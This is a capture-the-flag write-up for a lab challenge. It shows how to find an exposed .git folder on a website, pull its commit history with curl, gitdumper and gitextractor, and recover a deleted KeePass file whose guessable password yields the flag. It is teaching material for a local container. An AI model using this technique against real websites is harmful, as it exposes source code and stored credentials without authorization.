# Intro

I've been working for some very shady startups lately. This one had a very strange way to host their website. I think I made a mistake and accidentaly pushed their passwords to the public website. But don't worry, I took care of it.

# Setup

```
docker build -t uhctf_buzz
docker run -p 80:80 uhctf_buzz
```

# Write-up

Upon first inspection, the website looks pretty normal.

Using a recon tool (such as nmap), you can find out that there's a `.git` folder in the website.

From your browser, you can check out the git logs (as they are at the same place in every git repo):

```
curl http://url/.git/logs/refs/heads/main
0000000000000000000000000000000000000000 bcbfc37195ada44da6f2bbaafd2f32b8b6837ea0 Ward Segers <w@rdsegers.be> 1714602798 +0200	commit (initial): add site
bcbfc37195ada44da6f2bbaafd2f32b8b6837ea0 b2342887899ffbe10e244cb4e41db6f771b5c7c6 Ward Segers <w@rdsegers.be> 1714602820 +0200	commit: Remove password file
```

Now, you see that we have two git commits in this repo. We can use gittools to extract the contents of the two commits:

```
mkdir -p /tmp/buzz/git
gitdumper http://localhost:8080/.git/ /tmp/buzz/git
mkdir -p /tmp/buzz/commits
gitextractor /tmp/buzz/git /tmp/buzz/commits
```
Now, you can go to the correct git commit in the commits-folder.

Here, you find a KeePass-file, which contains passwords. The password might not be to difficult to guess: `buzz`.

You then find a single entry with the flag:

```
uhctf{s3c-s33ms-2-be-don3-by-p><l}
```
